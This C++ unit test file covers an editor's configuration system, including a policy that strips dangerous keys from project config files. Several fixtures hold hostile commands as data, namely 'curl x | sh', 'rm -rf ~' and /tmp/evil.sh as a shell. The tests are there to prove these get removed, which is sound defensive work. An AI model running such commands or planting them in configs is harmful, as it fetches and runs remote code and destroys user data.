//
// Created by gnilk on 19.08.23.
//
#include <testinterface.h>
#include <filesystem>
#include <fstream>
#include "Core/Config/ConfigNode.h"
#include "Core/Config/Config.h"
#include "Core/Config/ProjectConfigPolicy.h"
#include "Core/Config/ConfigFilePatcher.h"
#include "Core/API/ConfigAPI.h"
#include "Core/RuntimeConfig.h"
#include <sstream>
#include <algorithm>
#include "Core/Editor.h"


using namespace gedit;

extern "C" {
DLL_EXPORT int test_config(ITesting *t);
DLL_EXPORT int test_config_setint(ITesting *t);
DLL_EXPORT int test_config_setdyn(ITesting *t);
DLL_EXPORT int test_config_projectdir_cwd(ITesting *t);
DLL_EXPORT int test_config_projectdir_folderarg(ITesting *t);
DLL_EXPORT int test_config_projectdir_guards(ITesting *t);
DLL_EXPORT int test_config_project_strip(ITesting *t);
DLL_EXPORT int test_config_project_strip_section(ITesting *t);
DLL_EXPORT int test_config_project_merge(ITesting *t);
DLL_EXPORT int test_config_policy_denied(ITesting *t);
DLL_EXPORT int test_config_patch_replace(ITesting *t);
DLL_EXPORT int test_config_patch_insert(ITesting *t);
DLL_EXPORT int test_config_patch_newsection(ITesting *t);
DLL_EXPORT int test_config_patch_emptyfile(ITesting *t);
DLL_EXPORT int test_config_patch_quoting(ITesting *t);
DLL_EXPORT int test_config_patch_refuse(ITesting *t);
DLL_EXPORT int test_config_patch_realconfig(ITesting *t);
DLL_EXPORT int test_config_api_project_set(ITesting *t);
}

DLL_EXPORT int test_config(ITesting *t) {
    return kTR_Pass;
}

DLL_EXPORT int test_config_setint(ITesting *t) {
    ConfigNode node;

    node.SetInt("test1", 25);
    TR_ASSERT(t, node.GetInt("test1", -1) == 25);
    node.SetInt("test2", 50);
    TR_ASSERT(t, node.GetInt("test2", -1) == 50);

    auto s = node.ToString();
    printf("str: %s\n", s.c_str());
    return kTR_Pass;
}

enum kDummyTest : int {
    kApa = 1,
    kBpa = 2,
};
DLL_EXPORT int test_config_setdyn(ITesting *t) {
    ConfigNode node;

    node.SetValue<int>("bla",2);
    TR_ASSERT(t, node.GetInt("bla", -1) == 2);

    node.SetValue<std::string>("bla2","hello");
    TR_ASSERT(t, node.GetStr("bla2", "wef") == "hello");

    node.SetValue<int>("enum", kDummyTest::kApa);
    TR_ASSERT(t, node.GetValue<int>("enum", -1) == kDummyTest::kApa);

    return kTR_Pass;
}
// A scratch "home" with a few candidate project roots - ResolveProjectDir takes home as a parameter, so
// the guards are tested without touching the real $HOME.
static std::filesystem::path MakeFakeHome() {
    auto home = std::filesystem::temp_directory_path() / "goatedit_projcfg_test" / "home";
    std::error_code ec;
    std::filesystem::remove_all(home.parent_path(), ec);
    std::filesystem::create_directories(home / ".goatedit");               // ~/.goatedit (user dir, never a project)
    std::filesystem::create_directories(home / "proj" / ".goatedit");
    std::filesystem::create_directories(home / "other" / ".goatedit");
    std::filesystem::create_directories(home / "bare");                     // no .goatedit
    std::filesystem::create_directories(home.parent_path() / "outside" / ".goatedit");
    return home;
}

DLL_EXPORT int test_config_projectdir_cwd(ITesting *t) {
    auto home = MakeFakeHome();
    auto dir = Editor::ResolveProjectDir({}, home / "proj", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "proj" / ".goatedit");
    return kTR_Pass;
}

DLL_EXPORT int test_config_projectdir_folderarg(ITesting *t) {
    auto home = MakeFakeHome();
    // A folder argument beats the cwd; file arguments don't count; the LAST folder wins (it's where
    // OpenDocumentOrFolder leaves the cwd).
    auto file = (home / "proj" / "file.txt").string();
    { std::ofstream f(file); f << "x"; }
    auto dir = Editor::ResolveProjectDir({file, (home / "other").string()}, home / "proj", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "other" / ".goatedit");

    dir = Editor::ResolveProjectDir({(home / "other").string(), (home / "proj").string()}, home / "bare", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "proj" / ".goatedit");

    // Only a file argument -> the cwd decides
    dir = Editor::ResolveProjectDir({file}, home / "other", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "other" / ".goatedit");
    return kTR_Pass;
}

DLL_EXPORT int test_config_projectdir_guards(ITesting *t) {
    auto home = MakeFakeHome();
    // $HOME itself is never a project ('~/.goatedit' is the user dir)
    TR_ASSERT(t, !Editor::ResolveProjectDir({}, home, home).has_value());
    // No .goatedit -> nothing (resolving never creates it)
    TR_ASSERT(t, !Editor::ResolveProjectDir({}, home / "bare", home).has_value());
    TR_ASSERT(t, !std::filesystem::exists(home / "bare" / ".goatedit"));
    // Outside home - even with a .goatedit
    auto outside = home.parent_path() / "outside";
    TR_ASSERT(t, !Editor::ResolveProjectDir({}, outside, home).has_value());
    // An outside folder arg is the root (not a fallback to the cwd's project)
    TR_ASSERT(t, !Editor::ResolveProjectDir({outside.string()}, home / "proj", home).has_value());
    // A bare folder arg doesn't fall back to the cwd's project either
    TR_ASSERT(t, !Editor::ResolveProjectDir({(home / "bare").string()}, home / "proj", home).has_value());
    return kTR_Pass;
}

DLL_EXPORT int test_config_project_strip(ITesting *t) {
    auto projectConfig = ConfigNode::FromString(
        "main:\n"
        "  bootstrap_scripts:\n"
        "    - evil.script\n"
        "  plugin_directory: /tmp/evil\n"
        "  theme: project.theme.yml\n"
        "terminal:\n"
        "  shell: /tmp/evil.sh\n"
        "  init: -c 'curl x | sh'\n"
        "  bootstrap:\n"
        "    - rm -rf ~\n"
        "  scrollback_lines: 42\n"
        "logging:\n"
        "  logfile: /tmp/evil.log\n"
        "editorview:\n"
        "  wrap: word\n");
    TR_ASSERT(t, projectConfig.has_value());
    auto removed = ProjectConfigPolicy::StripDeniedKeys(projectConfig.value());
    TR_ASSERT(t, removed.size() == 6);

    auto &cfg = projectConfig.value();
    TR_ASSERT(t, !cfg["main"].HasKey("bootstrap_scripts"));
    TR_ASSERT(t, !cfg["main"].HasKey("plugin_directory"));
    TR_ASSERT(t, !cfg["terminal"].HasKey("shell"));
    TR_ASSERT(t, !cfg["terminal"].HasKey("init"));
    TR_ASSERT(t, !cfg["terminal"].HasKey("bootstrap"));
    TR_ASSERT(t, !cfg["logging"].HasKey("logfile"));
    // Everything else survives
    TR_ASSERT(t, cfg["main"].GetStr("theme") == "project.theme.yml");
    TR_ASSERT(t, cfg["terminal"].GetInt("scrollback_lines") == 42);
    TR_ASSERT(t, cfg["editorview"].GetStr("wrap") == "word");
    return kTR_Pass;
}

DLL_EXPORT int test_config_project_strip_section(ITesting *t) {
    // A section given as a scalar would replace the whole section on merge - the section goes.
    auto projectConfig = ConfigNode::FromString(
        "terminal: /tmp/evil.sh\n"
        "editorview:\n"
        "  wrap: word\n");
    TR_ASSERT(t, projectConfig.has_value());
    auto removed = ProjectConfigPolicy::StripDeniedKeys(projectConfig.value());
    TR_ASSERT(t, !projectConfig->HasKey("terminal"));
    TR_ASSERT(t, removed.size() == 1);
    TR_ASSERT(t, (*projectConfig)["editorview"].GetStr("wrap") == "word");
    return kTR_Pass;
}

DLL_EXPORT int test_config_project_merge(ITesting *t) {
    // The safety property: after strip + merge the base keeps its own values for denied keys, while
    // allowed keys take the project's value.
    auto base = ConfigNode::FromString(
        "terminal:\n"
        "  shell: /bin/zsh\n"
        "  bootstrap:\n"
        "    - ls\n"
        "editorview:\n"
        "  wrap: none\n");
    auto projectConfig = ConfigNode::FromString(
        "terminal:\n"
        "  shell: /tmp/evil.sh\n"
        "  bootstrap:\n"
        "    - rm -rf ~\n"
        "editorview:\n"
        "  wrap: word\n");
    TR_ASSERT(t, base.has_value() && projectConfig.has_value());
    ProjectConfigPolicy::StripDeniedKeys(projectConfig.value());
    base->MergeNode(projectConfig.value());

    TR_ASSERT(t, (*base)["terminal"].GetStr("shell") == "/bin/zsh");
    auto bootstrap = (*base)["terminal"].GetSequenceOfStr("bootstrap");
    TR_ASSERT(t, bootstrap.size() == 1);
    TR_ASSERT(t, bootstrap[0] == "ls");
    TR_ASSERT(t, (*base)["editorview"].GetStr("wrap") == "word");
    return kTR_Pass;
}

DLL_EXPORT int test_config_policy_denied(ITesting *t) {
    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"terminal", "shell"}));
    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"terminal", "bootstrap", "x"}));
    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"terminal"}));     // the whole section would replace shell
    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"main", "bootstrap_scripts"}));
    TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({"terminal", "scrollback_lines"}));
    TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({"editorview", "wrap"}));
    TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({}));
    return kTR_Pass;
}

//
// ConfigFilePatcher - the safety property throughout: every line we didn't target is byte-identical
// (comments included), and the result parses to "original + this value".
//
static const char *patchFixture =
    "# top comment\n"
    "main:\n"
    "  theme: default.theme.yml   # the theme\n"
    "  keymap: \"default_keymap\"\n"
    "\n"
    "logging:\n"
    "  # supported options\n"
    "  logsink: filesink\n"
    "  enable_modules:\n"
    "    - Editor\n"
    "#    - SDL3Screen\n"
    "editorview:\n"
    "  # soft wrap\n"
    "  wrap: none   # trailing\n"
    "languages:\n"
    "  cpp:\n"
    "    auto_indent: yes\n"
    "# trailing comment\n";

static std::vector<std::string> Lines(const std::string &text) {
    std::vector<std::string> lines;
    std::stringstream stream(text);
    std::string line;
    while (std::getline(stream, line)) {
        lines.push_back(line);
    }
    return lines;
}

DLL_EXPORT int test_config_patch_replace(ITesting *t) {
    auto result = ConfigFilePatcher::SetScalar(patchFixture, {"editorview", "wrap"}, "word");
    TR_ASSERT(t, result.isOk);
    auto before = Lines(patchFixture);
    auto after = Lines(result.text);
    TR_ASSERT(t, before.size() == after.size());
    for (size_t i = 0; i < before.size(); i++) {
        if (before[i] == "  wrap: none   # trailing") {
            TR_ASSERT(t, after[i] == "  wrap: word   # trailing");
        } else {
            TR_ASSERT(t, before[i] == after[i]);
        }
    }
    // A quoted value is replaced as a whole
    result = ConfigFilePatcher::SetScalar(patchFixture, {"main", "keymap"}, "my_keymap");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text.find("  keymap: my_keymap\n") != std::string::npos);
    // Same key twice gives the same file (idempotent)
    auto again = ConfigFilePatcher::SetScalar(result.text, {"main", "keymap"}, "my_keymap");
    TR_ASSERT(t, again.isOk);
    TR_ASSERT(t, again.text == result.text);
    return kTR_Pass;
}

DLL_EXPORT int test_config_patch_insert(ITesting *t) {
    // New key in an existing section -> right after the section's last content line
    auto result = ConfigFilePatcher::SetScalar(patchFixture, {"editorview", "tabsize"}, "4");
    TR_ASSERT(t, result.isOk);
    auto after = Lines(result.text);
    auto before = Lines(patchFixture);
    TR_ASSERT(t, after.size() == before.size() + 1);
    size_t idxWrap = 0;
    while (after[idxWrap] != "  wrap: none   # trailing") {
        idxWrap++;
    }
    TR_ASSERT(t, after[idxWrap + 1] == "  tabsize: 4");

    // Three levels deep, matching the existing indentation
    result = ConfigFilePatcher::SetScalar(patchFixture, {"languages", "cpp", "continue_comment"}, "no");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text.find("    auto_indent: yes\n    continue_comment: no\n# trailing comment\n") != std::string::npos);

    // A missing sub-section is created inside the existing section
    result = ConfigFilePatcher::SetScalar(patchFixture, {"languages", "json", "indent"}, "2");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text.find("    auto_indent: yes\n  json:\n    indent: 2\n") != std::string::npos);
    return kTR_Pass;
}

DLL_EXPORT int test_config_patch_newsection(ITesting *t) {
    auto result = ConfigFilePatcher::SetScalar(patchFixture, {"newsection", "key"}, "value");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text == std::string(patchFixture) + "newsection:\n  key: value\n");

    // No trailing newline on the last line - it gets one, nothing else changes
    result = ConfigFilePatcher::SetScalar("a:\n  b: 1", {"c", "d"}, "2");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text == "a:\n  b: 1\nc:\n  d: 2\n");
    return kTR_Pass;
}

DLL_EXPORT int test_config_patch_emptyfile(ITesting *t) {
    auto result = ConfigFilePatcher::SetScalar("", {"editorview", "wrap"}, "char");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text == "editorview:\n  wrap: char\n");

    // Comment-only file (a fresh '.cfg edit' header)
    result = ConfigFilePatcher::SetScalar("# header\n", {"editorview", "wrap"}, "char");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text == "# header\neditorview:\n  wrap: char\n");

    // A key with no value ('key:') is a null scalar - it can be set, its comment kept
    result = ConfigFilePatcher::SetScalar("a:\n  b:   # empty\n", {"a", "b"}, "x");
    TR_ASSERT(t, result.isOk);
    TR_ASSERT(t, result.text == "a:\n  b: x   # empty\n");
    return kTR_Pass;
}

DLL_EXPORT int test_config_patch_quoting(ITesting *t) {
    TR_ASSERT(t, ConfigFilePatcher::FormatScalar("word") == "word");
    TR_ASSERT(t, ConfigFilePatcher::FormatScalar("/bin/zsh") == "/bin/zsh");
    TR_ASSERT(t, ConfigFilePatcher::FormatScalar("") == "\"\"");
    TR_ASSERT(t, ConfigFilePatcher::FormatScalar("a: b") == "\"a: b\"");

    // A value that would otherwise read as a comment / mapping survives the round-trip
    auto result = ConfigFilePatcher::SetScalar(patchFixture, {"main", "theme"}, "my theme # not a comment");
    TR_ASSERT(t, result.isOk);
    auto node = YAML::Load(result.text);
    TR_ASSERT(t, node["main"]["theme"].Scalar() == "my theme # not a comment");
    TR_ASSERT(t, result.text.find("# the theme") != std::string::npos);
    return kTR_Pass;
}

DLL_EXPORT int test_config_patch_refuse(ITesting *t) {
    // Nothing that can't be placed safely is ever written - each of these must fail
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar(patchFixture, {"logging"}, "x").isOk);                         // a section
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar(patchFixture, {"logging", "enable_modules"}, "x").isOk);       // a list
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar(patchFixture, {"logging", "enable_modules", "x"}, "y").isOk);  // inside a list
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar(patchFixture, {"main", "theme", "x"}, "y").isOk);              // under a value
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar("a: {b: 1}\n", {"a", "b"}, "2").isOk);                         // flow style
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar("a:\n  b: 1\r\n", {"a", "b"}, "2").isOk);                      // CRLF
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar("a:\n\tb: 1\n", {"a", "b"}, "2").isOk);                        // tabs
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar("a: [\n", {"a", "b"}, "2").isOk);                              // doesn't parse
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar("- a\n- b\n", {"a", "b"}, "2").isOk);                          // top-level list
    TR_ASSERT(t, !ConfigFilePatcher::SetScalar(patchFixture, {"main", "bad key"}, "2").isOk);                 // key chars
    auto result = ConfigFilePatcher::SetScalar(patchFixture, {"logging", "enable_modules"}, "x");
    TR_ASSERT(t, !result.error.empty());
    return kTR_Pass;
}

DLL_EXPORT int test_config_patch_realconfig(ITesting *t) {
    // The shipped config.yml (heavily commented): replacing values keeps the line count, adding keys
    // only adds lines, and every comment line survives untouched.
    std::ifstream file("resources/config.yml");
    TR_ASSERT(t, file.is_open());
    std::stringstream buffer;
    buffer << file.rdbuf();
    auto original = buffer.str();
    auto originalLines = Lines(original);
    std::vector<std::string> commentLines;
    for (auto &line : originalLines) {
        if (line.find('#') != std::string::npos) {
            commentLines.push_back(line);
        }
    }

    struct Case { std::vector<std::string> keyPath; std::string value; int addedLines; };
    std::vector<Case> cases = {
        { {"editorview", "wrap"}, "word", 0 },
        { {"terminal", "scrollback_lines"}, "500", 0 },
        { {"languages", "default", "tabsize"}, "8", 0 },
        { {"session", "enabled"}, "no", 0 },
        { {"editorview", "brand_new"}, "1", 1 },
        { {"languages", "rust", "indent"}, "4", 2 },
        { {"zzz", "key"}, "v", 2 },
    };
    for (auto &c : cases) {
        auto result = ConfigFilePatcher::SetScalar(original, c.keyPath, c.value);
        TR_ASSERT(t, result.isOk);
        auto lines = Lines(result.text);
        TR_ASSERT(t, lines.size() == originalLines.size() + static_cast<size_t>(c.addedLines));
        // Every comment line is still there, except (at most) the edited line - its value changed but its
        // trailing comment must be kept
        size_t nMissing = 0;
        for (auto &commentLine : commentLines) {
            if (std::find(lines.begin(), lines.end(), commentLine) == lines.end()) {
                nMissing++;
            }
        }
        TR_ASSERT(t, nMissing <= ((c.addedLines == 0) ? 1u : 0u));
        auto comment = std::string("#");
        size_t nCommentsBefore = 0;
        size_t nCommentsAfter = 0;
        for (auto &line : originalLines) {
            nCommentsBefore += (line.find(comment) != std::string::npos) ? 1 : 0;
        }
        for (auto &line : lines) {
            nCommentsAfter += (line.find(comment) != std::string::npos) ? 1 : 0;
        }
        TR_ASSERT(t, nCommentsAfter == nCommentsBefore);
    }
    return kTR_Pass;
}

DLL_EXPORT int test_config_api_project_set(ITesting *t) {
    // End-to-end at the PROJECT level only (never touches the real user config): a scratch project dir is
    // made the sole kProject path, as EstablishProjectDir does.
    auto root = std::filesystem::temp_directory_path() / "goatedit_cfgapi_test";
    auto projectDir = root / ".goatedit";
    std::error_code ec;
    std::filesystem::remove_all(root, ec);
    std::filesystem::create_directories(projectDir);
    {
        std::ofstream f(projectDir / "config.yml");
        f << "# my project settings\ncfgtest:\n  value: a   # keep me\n";
    }
    RuntimeConfig::Instance().GetAssetLoader().ReplaceSearchPath(projectDir, AssetLoaderBase::kLocationType::kProject);

    ConfigAPI configApi;
    TR_ASSERT(t, configApi.ConfigFilePath(ConfigAPI::kLevel::kProject) == projectDir / "config.yml");
    auto result = configApi.Set(ConfigAPI::kLevel::kProject, "cfgtest.value", "b");
    TR_ASSERT(t, result.isOk);

    std::ifstream f(projectDir / "config.yml");
    std::stringstream buffer;
    buffer << f.rdbuf();
    TR_ASSERT(t, buffer.str() == "# my project settings\ncfgtest:\n  value: b   # keep me\n");
    TR_ASSERT(t, !std::filesystem::exists(projectDir / "config.yml.tmp"));

    // The running config follows (project is the highest level), when user/project config is in use
    if (Editor::Instance().IsUserConfigEnabled()) {
        TR_ASSERT(t, Config::Instance()["cfgtest"].GetStr("value") == "b");
    }
    auto get = configApi.Get(ConfigAPI::kLevel::kProject, "cfgtest.value");
    TR_ASSERT(t, get.isOk);
    TR_ASSERT(t, get.lines[0] == "cfgtest.value = b");

    // Denied keys are refused and nothing is written
    auto denied = configApi.Set(ConfigAPI::kLevel::kProject, "terminal.shell", "/tmp/evil.sh");
    TR_ASSERT(t, !denied.isOk);
    std::ifstream f2(projectDir / "config.yml");
    std::stringstream buffer2;
    buffer2 << f2.rdbuf();
    TR_ASSERT(t, buffer2.str() == buffer.str());

    // set needs a level; sections/lists can't be set
    TR_ASSERT(t, !configApi.Set(ConfigAPI::kLevel::kRunning, "cfgtest.value", "c").isOk);
    TR_ASSERT(t, !configApi.Set(ConfigAPI::kLevel::kProject, "languages.default", "x").isOk);

    Config::Instance().RemoveKey("cfgtest");
    std::filesystem::remove_all(root, ec);
    return kTR_Pass;
}
